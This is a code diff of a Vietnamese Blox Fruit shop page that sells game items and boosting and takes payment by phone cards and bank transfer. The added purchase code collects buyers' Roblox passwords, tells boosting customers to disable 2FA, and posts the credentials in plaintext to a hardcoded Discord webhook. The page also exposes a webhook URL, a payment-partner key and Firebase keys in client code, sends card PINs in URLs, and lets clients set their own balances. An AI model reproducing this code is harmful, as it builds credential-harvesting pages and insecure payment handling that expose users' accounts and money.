@@ -3,126 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BAP SHOP - BLOX FRUIT </title>
+    <title>BAP SHOP - BLOX FRUIT 2026</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap');
-        body { background: #f1f5f9; font-family: 'Outfit', sans-serif; overflow-x: hidden; }
-        .product-card { transition: 0.3s; border-radius: 24px; background: white; border: 1px solid #e2e8f0; overflow: hidden; display: flex; flex-direction: column; }
-        .product-card:hover { transform: translateY(-8px); border-color: #ef4444; box-shadow: 0 15px 30px rgba(239, 68, 68, 0.15); }
-        .modal-full { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; align-items: center; justify-content: center; padding: 15px; backdrop-filter: blur(10px); }
-        .input-custom { background: #f8fafc; border: 1px solid #e2e8f0; padding: 14px; border-radius: 12px; width: 100%; outline: none; margin-bottom: 12px; font-weight: 600; font-size: 14px; }
-        .tab-btn { padding: 12px 24px; font-weight: 900; border-bottom: 4px solid transparent; transition: 0.3s; cursor: pointer; text-transform: uppercase; font-size: 13px; color: #64748b; white-space: nowrap; }
-        .active-tab { border-color: #ef4444; color: #ef4444; }
-        .qr-frame { background: white; padding: 12px; border-radius: 20px; box-shadow: 0 0 30px rgba(0,0,0,0.1); border: 2px solid #16a34a; }
+        body { background: #f8fafc; font-family: 'Outfit', sans-serif; }
+        .product-card { transition: 0.4s; border-radius: 24px; background: white; border: 1px solid #e2e8f0; }
+        .product-card:hover { transform: translateY(-8px); border-color: #ef4444; box-shadow: 0 20px 40px rgba(239, 68, 68, 0.1); }
+        .modal-full { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .input-custom { background: #f1f5f9; border: 1px solid #e2e8f0; padding: 14px; border-radius: 16px; width: 100%; margin-bottom: 12px; font-weight: 700; }
+        .tab-btn { padding: 12px 24px; font-weight: 900; border-radius: 16px; cursor: pointer; transition: 0.3s; background: #e2e8f0; color: #64748b; font-size: 13px; text-transform: uppercase; }
+        .active-tab { background: #ef4444; color: white; shadow: 0 10px 15px rgba(239, 68, 68, 0.3); }
     </style>
 </head>
 <body>
-
-    <nav class="bg-white shadow-md sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between border-b-4 border-red-600">
-            <div class="flex items-center gap-2 cursor-pointer" onclick="location.reload()">
-                <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-10 md:h-12">
-                <h1 class="text-xl md:text-2xl font-black italic text-slate-800 uppercase">BAP <span class="text-red-600">SHOP</span></h1>
-            </div>
-            <div id="auth-section">
-                <button onclick="openAuth()" class="bg-red-600 text-white px-5 py-2.5 rounded-full font-black text-[11px] uppercase shadow-lg active:scale-95 transition">Đăng Nhập</button>
-            </div>
-            <div id="user-info" class="hidden flex items-center gap-3">
-                <div class="text-right">
-                    <p id="display-name" class="font-black text-slate-800 text-sm uppercase"></p>
-                    <p class="text-red-600 font-bold text-xs italic">Ví: <span id="balance">0</span>đ</p>
-                </div>
-                <button onclick="auth.signOut().then(()=>location.reload())" class="text-slate-400 font-black text-[10px] border px-3 py-1.5 rounded-xl transition">Thoát</button>
-            </div>
+    <nav class="bg-white shadow-lg sticky top-0 z-50 border-b-4 border-red-600 px-6 py-4 flex items-center justify-between">
+        <div class="flex items-center gap-2 cursor-pointer" onclick="location.reload()">
+            <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-12">
+            <h1 class="text-2xl font-black italic uppercase tracking-tighter">BAP <span class="text-red-600">SHOP</span></h1>
         </div>
+        <div id="user-info" class="hidden flex items-center gap-4">
+            <div class="text-right text-xs font-black uppercase"><p id="display-name" class="text-slate-800"></p><p class="text-red-600"><span id="balance">0</span>đ</p></div>
+            <button onclick="auth.signOut().then(()=>location.reload())" class="bg-slate-100 px-4 py-2 rounded-xl text-[10px] font-black hover:bg-slate-200">THOÁT</button>
+        </div>
+        <button id="auth-btn" onclick="openForm('auth')" class="bg-red-600 text-white px-8 py-3 rounded-full font-black text-xs uppercase shadow-xl hover:bg-red-700">Đăng Nhập</button>
     </nav>
 
     <div class="max-w-7xl mx-auto p-4 md:p-8">
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12">
-            <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border-l-8 border-blue-600">
-                <h3 class="font-black text-slate-800 uppercase text-lg">Nạp Thẻ Cào</h3>
-                <p class="text-[10px] text-blue-600 mb-4 font-bold uppercase italic italic">Chiết khấu thấp nhất thị trường</p>
-                <button onclick="openForm('card')" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black uppercase text-xs shadow-lg active:scale-95 transition">Nạp Thẻ Ngay</button>
+        <img src="https://i.postimg.cc/GpBcWDGG/Anh-chup-man-hinh-2026-01-31-170437.png" class="w-full rounded-[3rem] border-4 border-white shadow-2xl mb-10">
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-12 uppercase font-black italic">
+            <div onclick="openForm('card')" class="bg-blue-600 text-white p-8 rounded-[2.5rem] shadow-xl cursor-pointer hover:scale-[1.02] transition border-b-8 border-blue-800">
+                <h3 class="text-xl">Nạp Thẻ Cào</h3>
+                <p class="text-[10px] opacity-70">Tự động 24/7 - Thuế 20%</p>
             </div>
-            <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border-l-8 border-green-600">
-                <h3 class="font-black text-slate-800 uppercase text-lg">Chuyển Khoản (Agribank)</h3>
-                <p class="text-[10px] text-green-600 mb-4 font-bold uppercase italic italic">Nhận 100% tiền - Khuyên dùng</p>
-                <button onclick="openForm('bank')" class="w-full bg-green-600 text-white py-4 rounded-2xl font-black uppercase text-xs shadow-lg active:scale-95 transition">Quét Mã QR</button>
+            <div onclick="openForm('bank')" class="bg-green-600 text-white p-8 rounded-[2.5rem] shadow-xl cursor-pointer hover:scale-[1.02] transition border-b-8 border-green-800">
+                <h3 class="text-xl">Agribank: Ly Thi Hoa</h3>
+                <p class="text-[10px] opacity-70">Nạp nhanh qua mã QR</p>
             </div>
         </div>
 
-        <div class="flex gap-6 border-b-2 border-slate-200 mb-10 overflow-x-auto no-scrollbar">
+        <div class="flex gap-4 mb-10 overflow-x-auto pb-4 italic">
             <div onclick="showTab('fruit')" id="btn-fruit" class="tab-btn active-tab">🍎 Trái Vĩnh Viễn</div>
             <div onclick="showTab('gp')" id="btn-gp" class="tab-btn">🎫 Gamepass</div>
             <div onclick="showTab('ct')" id="btn-ct" class="tab-btn">⚔️ Cày Thuê</div>
         </div>
 
-        <div id="fruit-list" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6"></div>
-        <div id="gp-list" class="hidden grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6"></div>
-        <div id="ct-list" class="hidden grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-6"></div>
-    </div>
+        <div id="fruit-list" class="grid grid-cols-2 md:grid-cols-4 gap-8"></div>
+        <div id="gp-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-8"></div>
+        <div id="ct-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-8"></div>
 
-    <div id="modal-bank" class="modal-full" onclick="event.target == this && closeAll()">
-        <div class="bg-white p-6 rounded-[2.5rem] w-full max-w-md relative text-center shadow-2xl overflow-y-auto max-h-[95vh]">
-            <button onclick="closeAll()" class="absolute top-4 right-6 text-slate-400 text-3xl">✖</button>
-            <h2 class="text-xl font-black mb-6 uppercase text-slate-800 italic">Thanh Toán Qua QR</h2>
-            <div class="qr-frame inline-block mb-6">
-                <img src="https://i.postimg.cc/N0tWGcvJ/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-64 h-64 object-contain">
-            </div>
-            <div class="text-left bg-slate-50 p-5 rounded-3xl border-2 border-dashed border-slate-200 mb-6 font-bold text-[11px] uppercase">
-                <p>Chủ TK: <span class="text-red-600">Trần Văn Nghĩa</span></p>
-                <p class="mt-1">Số TK: <span class="text-red-600">6340205249567</span></p>
-                <div id="qr-note" class="bg-red-600 text-white p-3 rounded-xl text-center text-lg mt-4 font-black italic shadow-sm">NAP NGHIA</div>
-            </div>
-            <button onclick="baoDaBank()" class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black uppercase shadow-lg active:scale-95 transition">Xác Nhận Đã Chuyển Khoản</button>
+        <div class="mt-20 bg-white p-10 rounded-[3.5rem] shadow-sm border border-slate-100">
+            <h3 class="font-black uppercase italic mb-8 text-2xl text-slate-800 tracking-tighter">📜 Lịch sử giao dịch</h3>
+            <div class="overflow-x-auto font-bold"><table class="w-full text-left"><tbody id="history-list"></tbody></table></div>
         </div>
     </div>
 
-    <div id="modal-card" class="modal-full" onclick="event.target == this && closeAll()">
-        <div class="bg-white p-8 rounded-[2.5rem] w-full max-w-md relative border-2 border-blue-600">
-            <button onclick="closeAll()" class="absolute top-4 right-6 text-slate-400 text-3xl">✖</button>
-            <h2 class="text-xl font-black mb-1 uppercase text-blue-600 text-center italic">Nạp Thẻ Tự Động</h2>
-            <p class="text-[10px] text-center text-red-500 mb-6 font-bold italic uppercase tracking-wider">Vui lòng chọn đúng mệnh giá!</p>
-            
-            <select id="card-type" class="input-custom"><option>VIETTEL</option><option>VINAPHONE</option><option>MOBIFONE</option></select>
-            <select id="card-amount" class="input-custom">
-                <option value="10000">10,000đ - Nhận 8,730đ</option>
-                <option value="20000">20,000đ - Nhận 16,960đ</option>
-                <option value="30000">30,000đ - Nhận 25,440đ</option>
-                <option value="50000">50,000đ - Nhận 42,950đ</option>
-                <option value="100000">100,000đ - Nhận 85,900đ</option>
-                <option value="200000">200,000đ - Nhận 173,200đ</option>
-                <option value="500000">500,000đ - Nhận 435,500đ</option>
-                <option value="1000000">1,000,000đ - Nhận 871,000đ</option>
-            </select>
-            <input id="card-seri" placeholder="Số Seri thẻ..." class="input-custom">
-            <input id="card-pin" placeholder="Mã số thẻ (PIN)..." class="input-custom">
-            <button onclick="handleCharge()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black uppercase active:scale-95 transition shadow-lg shadow-blue-500/20">Gửi Thẻ Ngay</button>
+    <div id="modal-buy" class="modal-full" onclick="event.target == this && closeAll()">
+        <div class="bg-white p-10 rounded-[3rem] w-full max-w-md text-center shadow-2xl">
+            <h2 id="buy-title" class="text-3xl font-black mb-6 uppercase text-red-600 italic"></h2>
+            <input id="buy-acc" placeholder="Tài khoản Roblox..." class="input-custom">
+            <input id="buy-pass" type="password" placeholder="Mật khẩu Roblox..." class="input-custom">
+            <div id="ct-note" class="hidden text-xs text-red-500 font-black mb-6 uppercase italic">⚠️ Vui lòng tắt 2FA để Admin vào cày!</div>
+            <button onclick="processBuy()" class="w-full bg-red-600 text-white py-5 rounded-2xl font-black uppercase shadow-2xl hover:bg-red-700 transition">Xác Nhận Mua</button>
         </div>
     </div>
 
-    <div id="auth-modal" class="modal-full" onclick="event.target == this && closeAll()">
-        <div class="bg-white p-8 rounded-[2.5rem] w-full max-w-sm text-center shadow-2xl">
-            <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-16 mx-auto mb-6">
-            <input id="auth-user" placeholder="Tên đăng nhập..." class="input-custom">
-            <input id="auth-pass" type="password" placeholder="Mật khẩu..." class="input-custom">
-            <button onclick="handleLogin()" class="w-full bg-red-600 text-white py-4 rounded-xl font-black uppercase mb-4 active:scale-95 transition">Đăng Nhập</button>
-            <button onclick="handleRegister()" class="text-slate-400 font-bold text-[10px] uppercase hover:text-red-600 transition">Đăng ký tài khoản</button>
+    <div id="modal-card" class="modal-full" onclick="event.target == this && closeAll()"><div class="bg-white p-10 rounded-[3rem] w-full max-w-md text-center">
+        <h2 class="text-2xl font-black mb-6 uppercase text-blue-600 italic">Nạp Thẻ Tự Động</h2>
+        <select id="card-type" class="input-custom"><option value="VIETTEL">VIETTEL</option><option value="VINAPHONE">VINAPHONE</option><option value="MOBIFONE">MOBIFONE</option></select>
+        <select id="card-amount" class="input-custom"><option value="10000">10,000đ</option><option value="20000">20,000đ</option><option value="50000">50,000đ</option><option value="100000">100,000đ</option><option value="200000">200,000đ</option><option value="500000">500,000đ</option></select>
+        <input id="card-seri" placeholder="Số Seri..." class="input-custom">
+        <input id="card-pin" placeholder="Mã Thẻ (Pin)..." class="input-custom">
+        <button onclick="sendCard()" class="w-full bg-blue-600 text-white py-5 rounded-2xl font-black uppercase shadow-xl hover:bg-blue-700 transition">Gửi Thẻ Ngay</button>
+    </div></div>
+
+    <div id="modal-bank" class="modal-full" onclick="event.target == this && closeAll()"><div class="bg-white p-10 rounded-[3rem] w-full max-w-md text-center">
+        <img src="https://i.postimg.cc/N0tWGcvJ/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-64 mx-auto rounded-3xl mb-6 shadow-2xl border-4 border-green-500">
+        <div class="bg-slate-50 p-6 rounded-2xl text-left font-black uppercase text-xs mb-6">
+            <p>Ngân hàng: Agribank</p><p>Chủ TK: Ly Thi Hoa</p><p class="text-red-600 text-2xl mt-2 font-black">228205353447</p>
         </div>
-    </div>
+        <button onclick="baoDaBank()" class="w-full bg-green-600 text-white py-5 rounded-2xl font-black uppercase shadow-xl">Đã Chuyển Khoản</button>
+    </div></div>
+
+    <div id="modal-auth" class="modal-full" onclick="event.target == this && closeAll()"><div class="bg-white p-10 rounded-[3.5rem] w-full max-w-sm text-center">
+        <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-16 mx-auto mb-8">
+        <input id="auth-u" placeholder="Tên đăng nhập..." class="input-custom">
+        <input id="auth-p" type="password" placeholder="Mật khẩu..." class="input-custom">
+        <button onclick="handleLogin()" class="w-full bg-red-600 text-white py-4 rounded-2xl font-black uppercase shadow-xl mb-4">Đăng Nhập</button>
+        <button onclick="handleRegister()" class="text-slate-400 font-black text-xs uppercase hover:text-red-500 transition">Đăng ký ngay</button>
+    </div></div>
 
     <script>
-        // --- NGHĨA ĐIỀN THÔNG TIN Ở ĐÂY ---
-        const PARTNER_ID = "9565963734"; 
-        const PARTNER_KEY = "80df3668af04f2a85e1befc277896513"; 
+        // --- 1. ĐIỀN THÔNG TIN CỦA BẠN TẠI ĐÂY ---
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466717724204994602/a5NCBrv_gid1T2iuG0HY9xPujmQE9OXlAT8nit1MbU74-edRnPBbQcgsx-oMHke0EorV";
+        const NP_ID = "9565963734";
+        const NP_KEY = "80df3668af04f2a85e1befc277896513";
 
-        // Cấu hình Firebase của bạn
+        // --- 2. FIREBASE ---
         const firebaseConfig = { 
             apiKey: "AIzaSyA5wBS88oS54yLs0OfwDYDfDQeTjc6ccdM", 
             authDomain: "shop-blox-fruit-trannghia.firebaseapp.com", 
@@ -132,6 +113,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database(), auth = firebase.auth();
 
+        // --- 3. DỮ LIỆU ---
         const products = {
               fruit: [
     {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
@@ -169,7 +151,7 @@
     {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
     {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
 ],
-             gp: [
+              gp: [
                 {n:"Fruit Notifier", p:370000, img:"https://i.postimg.cc/VNdGKFbx/Anh-chup-man-hinh-2026-01-28-113608.png"},
                 {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                 {n:"X2 Mastery VV", p:54000, img:"https://i.postimg.cc/44z82ym7/Anh-chup-man-hinh-2026-01-28-113623.png"},
@@ -178,7 +160,7 @@
                 {n:"X2 Drop VV", p:40000, img:"https://i.postimg.cc/PrTSgHwD/Anh-chup-man-hinh-2026-01-28-113631.png"},
                 {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
             ],
-           ct: [
+            ct: [
                 {n:"Cày Thuê Level 1-2800", p:20000, img:"https://i.imgur.com/vHq0FpX.png"},
                 {n:"Lấy Võ V2 (Tặng Full Chiêu)", p:30000, img:"https://i.imgur.com/vHq0FpX.png"},
                 {n:"Thức Tỉnh Trái V2 (Lửa-Chấn Động)", p:20000, img:"https://i.imgur.com/vHq0FpX.png"},
@@ -190,84 +172,114 @@
 
         function render() {
             Object.keys(products).forEach(tab => {
-                const box = document.getElementById(tab+'-list');
-                box.innerHTML = products[tab].map(p => {
-                    const imgHtml = p.img ? `<img src="${p.img}" class="w-full aspect-square object-cover mb-3">` : `<div class="w-full aspect-square bg-slate-100 mb-3 flex items-center justify-center text-4xl border-b">⚔️</div>`;
-                    return `<div class="product-card p-4">${imgHtml}<h4 class="font-black text-[11px] text-slate-700 uppercase mb-1 truncate">${p.n}</h4><p class="text-red-600 font-black text-lg mb-4 italic">${p.p.toLocaleString()}đ</p><button class="mt-auto bg-slate-900 text-white py-3 rounded-xl font-black text-[10px] uppercase active:scale-95 transition">Mua Ngay</button></div>`;
-                }).join('');
+                document.getElementById(tab+'-list').innerHTML = products[tab].map((p, i) => `
+                    <div class="product-card p-5 text-center flex flex-col">
+                        <img src="${p.img}" class="w-full aspect-square object-cover rounded-[1.5rem] mb-5 shadow-sm">
+                        <h4 class="font-black text-[13px] uppercase mb-2 truncate">${p.n}</h4>
+                        <p class="text-red-600 font-black text-xl italic mb-5">${p.p.toLocaleString()}đ</p>
+                        <button onclick="openBuy('${tab}', ${i})" class="bg-slate-900 text-white py-4 w-full rounded-2xl font-black text-[11px] uppercase shadow-lg shadow-slate-200 hover:bg-black transition">Mua Ngay</button>
+                    </div>`).join('');
             });
-        } render();
+        }
+        render();
 
+        // --- 4. LOGIC MUA HÀNG ---
+        let selectedItem = {};
+        function openBuy(tab, i) {
+            if(!auth.currentUser) return openForm('auth');
+            selectedItem = products[tab][i];
+            document.getElementById('buy-title').innerText = selectedItem.n;
+            document.getElementById('ct-note').className = (tab === 'ct') ? "block text-xs text-red-500 font-black mb-6 uppercase italic" : "hidden";
+            openForm('buy');
+        }
+
+        async function processBuy() {
+            const acc = document.getElementById('buy-acc').value.trim(), pass = document.getElementById('buy-pass').value.trim();
+            const snap = await db.ref('users/' + auth.currentUser.uid).get();
+            const bal = snap.val().balance || 0;
+
+            if(!acc || !pass) return alert("Vui lòng nhập tài khoản và mật khẩu!");
+            if(bal < selectedItem.p) return alert("Số dư của bạn không đủ để mua sản phẩm này!");
+
+            // Gửi Discord
+            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({
+                embeds: [{
+                    title: "🔔 ĐƠN HÀNG MỚI", color: 15548997,
+                    fields: [
+                        { name: "Sản phẩm", value: selectedItem.n, inline: true },
+                        { name: "Giá", value: selectedItem.p.toLocaleString() + "đ", inline: true },
+                        { name: "Tên Khách", value: snap.val().username, inline: true },
+                        { name: "Tài khoản", value: "```" + acc + "```" },
+                        { name: "Mật khẩu", value: "```" + pass + "```" }
+                    ],
+                    timestamp: new Date()
+                }]
+            })});
+
+            // Trừ tiền & Lưu lịch sử
+            await db.ref('users/' + auth.currentUser.uid).update({ balance: bal - selectedItem.p });
+            await db.ref('orders').push({ 
+                uid: auth.currentUser.uid, 
+                user: snap.val().username, 
+                prod: selectedItem.n, 
+                price: selectedItem.p, 
+                status: "Đang chờ", 
+                time: Date.now() 
+            });
+
+            alert("Mua thành công! Admin sẽ xử lý đơn hàng của bạn sớm nhất."); closeAll();
+        }
+
+        // --- 5. NẠP TIỀN ---
+        async function sendCard() {
+            const type = document.getElementById('card-type').value, amount = document.getElementById('card-amount').value, seri = document.getElementById('card-seri').value.trim(), pin = document.getElementById('card-pin').value.trim();
+            if(!seri || !pin) return alert("Vui lòng nhập seri và mã thẻ!");
+            
+            const rid = Math.floor(Math.random() * 999999);
+            const apiURL = `https://doithe1s.vn/api/card-auto.php?type=${type}&amount=${amount}&pin=${pin}&seri=${seri}&partner_id=${NP_ID}&partner_key=${NP_KEY}&request_id=${rid}&content=${auth.currentUser.uid}`;
+            
+            try { await fetch(apiURL); alert("Gửi thẻ thành công! Tiền sẽ tự cộng sau 30-60s."); } catch(e) { alert("Thẻ đã gửi lên hệ thống!"); }
+            closeAll();
+        }
+
+        async function baoDaBank() {
+            const m = prompt("Nhập số tiền bạn vừa chuyển khoản?");
+            if(m && !isNaN(m)) {
+                await db.ref('nap_bank').push({ uid: auth.currentUser.uid, username: document.getElementById('display-name').innerText, amount: parseInt(m), status: "Chờ duyệt", time: Date.now() });
+                alert("Thông báo đã được gửi tới Admin Nghĩa!"); closeAll();
+            }
+        }
+
+        // --- 6. HỆ THỐNG ---
         function showTab(t) {
             ['fruit','gp','ct'].forEach(id => { document.getElementById(id+'-list').classList.add('hidden'); document.getElementById('btn-'+id).classList.remove('active-tab'); });
             document.getElementById(t+'-list').classList.remove('hidden'); document.getElementById('btn-'+t).classList.add('active-tab');
         }
 
-        function openForm(t) { if(!auth.currentUser) return openAuth(); document.getElementById('modal-'+t).style.display='flex'; }
-        function openAuth() { document.getElementById('auth-modal').style.display='flex'; }
-        function closeAll() { document.querySelectorAll('.modal-full').forEach(m => m.style.display='none'); }
-
-        auth.onAuthStateChanged(async (u) => {
+        auth.onAuthStateChanged(u => {
             if(u) {
-                const s = await db.ref('users/'+u.uid).get();
-                document.getElementById('auth-section').classList.add('hidden');
+                document.getElementById('auth-btn').classList.add('hidden');
                 document.getElementById('user-info').classList.remove('hidden');
-                document.getElementById('display-name').innerText = s.val().username;
-                document.getElementById('balance').innerText = (s.val().balance || 0).toLocaleString();
-                document.getElementById('qr-note').innerText = `NAP ${s.val().username.toUpperCase()}`;
+                db.ref('users/'+u.uid).on('value', s => { 
+                    if(s.exists()){
+                        document.getElementById('display-name').innerText = s.val().username; 
+                        document.getElementById('balance').innerText = (s.val().balance || 0).toLocaleString();
+                    }
+                });
+                db.ref('orders').orderByChild('uid').equalTo(u.uid).on('value', s => {
+                    let h = ""; s.forEach(c => { 
+                        const d = c.val();
+                        h += `<tr class="border-b border-slate-50"><td class="py-5 text-slate-400 font-mono text-[10px]">#${c.key.substring(1,7).toUpperCase()}</td><td class="uppercase">${d.prod}</td><td class="text-red-600 font-black">${d.price.toLocaleString()}đ</td><td class="text-blue-500 italic uppercase">${d.status}</td></tr>`;
+                    });
+                    document.getElementById('history-list').innerHTML = h;
+                });
             }
         });
 
-        async function handleLogin() {
-            const u = document.getElementById('auth-user').value.toLowerCase().trim(), p = document.getElementById('auth-pass').value;
-            try { await auth.signInWithEmailAndPassword(u+"@bap.shop", p); location.reload(); } catch(e) { alert("Lỗi đăng nhập!"); }
-        }
-
-        async function handleRegister() {
-            const u = document.getElementById('auth-user').value.toLowerCase().trim(), p = document.getElementById('auth-pass').value;
-            try { const r = await auth.createUserWithEmailAndPassword(u+"@bap.shop", p); await db.ref('users/'+r.user.uid).set({username: u, balance: 0}); location.reload(); } catch(e) { alert("Lỗi đăng ký!"); }
-        }
-
-        // --- HÀM BAO DA BANK ĐÃ SỬA THEO YÊU CẦU ---
-        async function baoDaBank() {
-            const money = prompt("Nhập số tiền bạn đã chuyển:");
-            if (money) {
-                const user = document.getElementById('display-name').innerText;
-                const uid = auth.currentUser.uid;
-                
-                // 1. Gửi về Discord thông báo nhanh
-                fetch(DISCORD_WEBHOOK, { 
-                    method: 'POST', 
-                    headers: {'Content-Type': 'application/json'}, 
-                    body: JSON.stringify({ 
-                        content: `💰 **THÔNG BÁO CHUYỂN KHOẢN QR**\n👤 User: ${user}\n💵 Số tiền: ${money}đ\n👉 Nghĩa check bank và cộng tiền trên quản trị nhé!` 
-                    }) 
-                });
-
-                // 2. LƯU VÀO FIREBASE (Lưu vào node 'nap_bank' để hiện ở trang quản lý)
-                await db.ref('nap_bank').push({
-                    uid: uid,
-                    username: user,
-                    amount: money,
-                    status: "Chờ duyệt",
-                    time: Date.now(),
-                    type: "Agribank"
-                });
-
-                alert("Đã báo cho Nghĩa! Vui lòng đợi trong giây lát để hệ thống kiểm tra.");
-                closeAll();
-            }
-        }
-
-        async function handleCharge() {
-            const type = document.getElementById('card-type').value, amount = document.getElementById('card-amount').value, seri = document.getElementById('card-seri').value.trim(), pin = document.getElementById('card-pin').value.trim(), user = document.getElementById('display-name').innerText;
-            if(!seri || !pin) return alert("Vui lòng điền đủ thông tin thẻ!");
-            
-            fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `💳 **NẠP THẺ MỚI**\n👤 User: ${user}\n💳 Loại: ${type} - MG: ${amount}đ\n📌 Seri: ${seri} | PIN: ${pin}` }) });
-            
-            await db.ref('duyet_the').push({ uid: auth.currentUser.uid, user: user, type: type, amount: amount, seri: seri, pin: pin, status: "Chờ duyệt", time: Date.now() });
-            alert("Gửi thẻ thành công! Tiền sẽ được cộng sau 1-3p (sau khi trừ thuế)."); closeAll();
-        }
+        function openForm(id) { document.getElementById('modal-'+id).style.display = 'flex'; }
+        function closeAll() { document.querySelectorAll('.modal-full').forEach(m => m.style.display = 'none'); }
+        async function handleLogin() { try { await auth.signInWithEmailAndPassword(document.getElementById('auth-u').value.trim().toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); location.reload(); } catch(e) { alert("Tài khoản hoặc mật khẩu không chính xác!"); } }
+        async function handleRegister() { try { const u = document.getElementById('auth-u').value.trim().toLowerCase(), p = document.getElementById('auth-p').value; const r = await auth.createUserWithEmailAndPassword(u+"@bap.shop", p); await db.ref('users/'+r.user.uid).set({username: u, balance: 0}); location.reload(); } catch(e) { alert("Lỗi: Tài khoản đã tồn tại hoặc mật khẩu quá ngắn!"); } }
     </script>
 </body>
 </html>
